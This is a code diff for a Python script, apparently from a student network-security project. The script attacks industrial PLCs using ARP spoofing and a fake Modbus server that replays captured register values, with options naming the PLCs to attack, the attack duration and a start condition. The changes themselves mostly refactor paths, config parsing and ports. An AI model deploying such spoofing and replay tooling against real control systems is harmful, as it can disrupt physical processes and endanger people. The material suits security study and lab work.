@@ -16,8 +16,8 @@ from scapy.all import get_if_hwaddr
 
 
 
-JSON_PATH = "./networkSecurityProject/registerCapture/historian/"
-config_file = "/networkSecurityProject/config.ini"
+JSON_PATH = "./registerCapture/historian/"
+config_file = "./config.ini"
 
 
 holding_registers = [15, 20, 30, 40]
@@ -47,23 +47,30 @@ def run_arpspoof_reverse(target_ip, gateway_ip):
     time.sleep(60)
     process.terminate()
 
-def parse_config_file(config_file, plc_names):
+def parse_config_file(config_file, target_names):
     config = configparser.ConfigParser()
     config.read(config_file)
 
-    plc_ips = []
-    plc_ports = []
-    hmi_ip = config.get("Network", "hmi_ip")
-    hmi_port = config.get("Network", "hmi_port")
+    ips = []
+    ports = []
 
-    for section in config.sections():
-        if section.startswith('plc'):
-            if plc_names and section not in plc_names:
-                continue
-            plc_ips.append(config.get(section, 'ip'))
-            plc_ports.append(config.get(section, 'port'))
+    ips.append(config.get(target_names[0], 'ip'))
+    ips.append(config.get(target_names[1], 'ip'))
+    ports.append(config.get(target_names[0], 'port'))
+    ports.append(config.get(target_names[1], 'port'))
 
-    return plc_ips, plc_ports, hmi_ip, hmi_port
+    return ips, ports
+    # hmi_ip = config.get("Network", "hmi_ip")
+    # hmi_port = config.get("Network", "hmi_port")
+
+    # for section in config.sections():
+    #     if section.startswith('plc'):
+    #         if plc_names and section not in plc_names:
+    #             continue
+    #         plc_ips.append(config.get(section, 'ip'))
+    #         plc_ports.append(config.get(section, 'port'))
+
+    # return plc_ips, plc_ports, hmi_ip, hmi_port
 
 def updating_writer(context, json_path):
     ''' A worker process that runs every so often and
@@ -89,7 +96,7 @@ def updating_writer(context, json_path):
     context[0].setValues(2, 0, discrete_input_values)
     context[0].setValues(4, 0, input_register_values)
     context[0].setValues(3, 0, holding_output_register_values)
-    context[0].setValues(3, len(holding_registers)+1, memory_register_values) # se non troviamo l'address iniziale partiamo da 1024
+    context[0].setValues(3, 1024, memory_register_values) # se non troviamo l'address iniziale partiamo da 1024
     context[0].setValues(1, 0, coil_values)
 
 def run_async_server():
@@ -119,7 +126,7 @@ def run_async_server():
     loop.start(times, now=False) # initially delay by time
     
     
-    thread = Thread(target=StartTcpServer, kwargs={"context":context,"host":'localhost',"identity":identity,"address":("127.0.0.1", 5030)})
+    thread = Thread(target=StartTcpServer, kwargs={"context":context,"host":'localhost',"identity":identity,"address":("127.0.0.1", 502)})
     thread.start()
     
     # TCP Server
@@ -135,7 +142,7 @@ def run_async_server():
     '''
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--plc', nargs='+', required=True, help='PLCs to attack')
+    parser.add_argument('--target', nargs=2, required=True, help='PLCs to attack')
     parser.add_argument('--time', type=int, required=True, help='Attack duration in minutes')
     #parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
     parser.add_argument('--condition', type=str, help='Condition to start the attack')
